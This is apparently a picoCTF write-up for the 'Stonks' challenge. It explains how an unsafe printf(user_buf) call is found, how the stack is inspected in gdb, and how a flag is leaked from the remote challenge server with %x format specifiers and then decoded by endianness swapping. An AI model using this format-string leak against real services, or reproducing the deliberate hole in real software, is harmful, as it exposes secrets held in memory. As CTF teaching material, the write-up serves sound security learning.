# PicoCTF: Stonks

## TL;DR:

The cleartext flag value is read from a file in the current directory into a
`char[]` stack local variable. The same function uses `scanf()` to read attacker
controlled input from stdin into a heap allocated buffer. The input buffer is
then passed as the sole argument to `printf()`, giving the attacker control of
the format string and thus the ability to leak stack contents.

Techniques
- Format string abuse

Mitigations
- None.

## Notes

1. The `buy_stonks()` function includes a stack variable,
`char api_buf[FLAG_BUFFER]`, which sure seems like a big hint about where the
flag resides.

The variable is wholely allocated on the `buy_stonks` stack frame.

See the TODO about reading API token from file, and poke at the `scanf()` call,
trying to see if maybe I can trick it into skipping the terminating null by
sending long (300+ chars) input. Alas, I cannot; the 300 character limit of
`scanf()`'s read with `300+1` from the `malloc()` mean I can't fill the last
byte of `user_buf` with a non-null character.

2. Use `clang` to locally compile `vuln.c` and get a warning that the
`user_buf` variable passed to `scanf()` is unsafe.

```
(stonks) kavefish@cairn:stonks/ $ clang -g -o stonks vuln.c
vuln.c:93:9: warning: format string is not a string literal (potentially insecure) [-Wformat-security]
        printf(user_buf);
               ^~~~~~~~
vuln.c:93:9: note: treat the string as an argument to avoid this
        printf(user_buf);
               ^
               "%s",
1 warning generated.
```

Hm. So this is a format string challenge.

3. Go read about exploiting format string bugs

This [resource](https://null-byte.wonderhowto.com/how-to/exploit-development-read-write-programs-memory-using-format-string-vulnerability-0181919/) was a good refresher.

Get inspired to run the binary under a debugger to explore stack layout.

```
(stonks) kavefish@cairn:stonks/ $ echo "ctf{FLAGFLAGFLAG}" > api
(stonks) kavefish@cairn:stonks/ $ gdb --args ./stonks
pwndbg> b vuln.c:93
Breakpoint 2 at 0x151c: file vuln.c, line 93.
pwndbg> r
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%s%s%s%s
Buying stonks with token:
```

So the stack looks like this:

```
00:0000│ rsp 0x7fffffffdef0 —▸ 0x55555555a940 ◂— '%s%s%s%s'
01:0008│     0x7fffffffdef8 —▸ 0x55555555a920 ◂— 0x4c00000003
02:0010│     0x7fffffffdf00 ◂— 0x3
03:0018│     0x7fffffffdf08 —▸ 0x5555555596d0 ◂— 0xfbad2488
04:0020│     0x7fffffffdf10 ◂— 'ctf{FLAGFLAGFLAG}\n'
05:0028│     0x7fffffffdf18 ◂— 'FLAGFLAG}\n'
06:0030│     0x7fffffffdf20 ◂— 0x555555000a7d /* '}\n' */
07:0038│     0x7fffffffdf28 —▸ 0x7ffff7f9bc80 (main_arena) ◂— 0x0
```

And we can see the flag is the 5th item on the stack, which means `scanf()`
should be able to copy the flag into `user_buf`, which will be `printf()`ed and
thus leaked back to us.

## Leak the flag

Sending a format string of `"%s%s%s%s"` causes the remote process to crash with
a SIG_SEGV, likely due to traversing a pointer to unmapped memory. Sending one
fewer `%s` causes some stack memory to be included in `user_buf` and returned
to us. However, nothing in the output takes the form of `picoCTF{...}.`

Since strings aren't working, switch from `%s` to `%x` to print bytes in raw
hex. Experiment with now many words to return; codify in `exploit.py`.

```
(stonks) kavefish@cairn:stonks/ $ ./exploit.py
[+] Opening connection to mercury.picoctf.net on port 20195: Done
[*] Switching to interactive mode
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
Buying stonks with token:
906F3F0804B00080489C3F7F2CD80FFFFFFFF1906D160F7F3A110F7F2CDC70906E1801906F3D0906F3F06F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E3534303664303664FF97007DF7F67AF8F7F3A4403E7ADE0010F7DC9CE9F7F3B0C0F7F2C5C0
Portfolio as of Tue May  3 23:56:48 UTC 2022


1 shares of MZV
2 shares of SIF
1 shares of NWUV
6 shares of VCKV
37 shares of XBY
80 shares of GXDP
745 shares of F
227 shares of CXTH
Goodbye!
[*] Got EOF while reading in interactive
```

Copy all the returned bytes into CyberChef and decode "From Hex". The output
includes a structure that sort of looks like `foo{bar}`, but it's jumbled:

```
.o?..°..H.?.,Ø.ÿÿÿñ.m...:...,Üp.n...o=	.óðocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ..}÷özø÷ó¤@>zÞ..÷Ü.é÷ó°À÷òÅÀ
```

Keep messing with CyberChef "Data format" operations until stumbling upon "Swap
Endianness". That's worth a try.

The message is still jumbled after enabling the operation, but in a different
way. The "Swap Endianness" operation has a word length parameter, which
defaults to 4. Try fiddling with it. No luck.

Word length sort of implies alignment is a factor in decoding. Maybe some
preceeding garbage stack data is pushing the string data out of alignment.
Start deleting bytes from the front of the input buffer.

After deleting a couple of the leading bytes the flag finally renders clearly.

[Solution](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',4,true)From_Hex('Auto')&input=M0IwODA0QjAwMDgwNDg5QzNGN0VDM0Q4MEZGRkZGRkZGMTlBQjcxNjBGN0VEMTExMEY3RUMzREM3MDlBQjgxODA0OUFCOTM5MDlBQjkzQjA2RjYzNjk3MDdCNDY1NDQzMzA2QzVGNDkzNDVGNzQzNTZENUY2QzZDMzA2RDVGNzk1Rjc5MzM2RTM1MzQzMDM2NjQzMDM2NjRGRkI5MDA3REY)
